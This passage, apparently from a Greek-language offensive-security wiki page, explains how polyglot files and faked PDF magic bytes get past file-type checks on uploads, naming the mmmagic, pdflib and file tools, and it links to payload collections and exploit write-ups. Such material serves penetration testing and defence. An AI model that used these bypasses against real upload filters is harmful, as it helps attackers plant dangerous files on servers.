Η βασική χρησιμότητα των polyglot files έγκειται στην ικανότητά τους να παρακάμπτουν μηχανισμούς ασφαλείας που ελέγχουν αρχεία βάσει τύπου. Συνήθη πρακτική σε διάφορες εφαρμογές είναι να επιτρέπονται μόνο ορισμένοι τύποι αρχείων για upload — όπως JPEG, GIF ή DOC — για να μειωθεί ο κίνδυνος από δυνητικά επικίνδυνα formats (π.χ., JS, PHP ή Phar αρχεία). Ωστόσο, ένα polyglot, συμμορφούμενο με τις δομικές προϋποθέσεις πολλαπλών τύπων αρχείων, μπορεί αθόρυβα να παρακάμψει αυτούς τους περιορισμούς.

Παρόλη την προσαρμοστικότητά τους, τα polyglots αντιμετωπίζουν περιορισμούς. Για παράδειγμα, ενώ ένα polyglot μπορεί ταυτόχρονα να είναι PHAR file (PHp ARchive) και JPEG, η επιτυχία του upload μπορεί να εξαρτάται από την πολιτική της πλατφόρμας σχετικά με τις επεκτάσεις αρχείων. Αν το σύστημα είναι αυστηρό όσον αφορά τις επιτρεπόμενες επεκτάσεις, η απλή δομική διττότητα ενός polyglot μπορεί να μην είναι επαρκής για να εγγυηθεί το upload.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Πώς να αποφύγετε τον εντοπισμό τύπου αρχείου ανεβάζοντας ένα έγκυρο JSON αρχείο ακόμα και αν δεν επιτρέπεται, προσποιούμενοι ότι είναι PDF (τεχνικές από **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Όσο τα magic bytes `%PDF` βρίσκονται στα πρώτα 1024 bytes είναι έγκυρο (δείτε παράδειγμα στο post)
- **`pdflib` library**: Προσθέστε ένα ψεύτικο PDF format μέσα σε ένα πεδίο του JSON ώστε η βιβλιοθήκη να νομίζει ότι είναι pdf (δείτε παράδειγμα στο post)
- **`file` binary**: Μπορεί να διαβάσει μέχρι 1048576 bytes από ένα αρχείο. Δημιουργήστε ένα JSON μεγαλύτερο από αυτό ώστε να μην μπορεί να κάνει parse το περιεχόμενο ως json και μετά μέσα στο JSON βάλτε το αρχικό μέρος ενός πραγματικού PDF και θα θεωρήσει ότι είναι PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
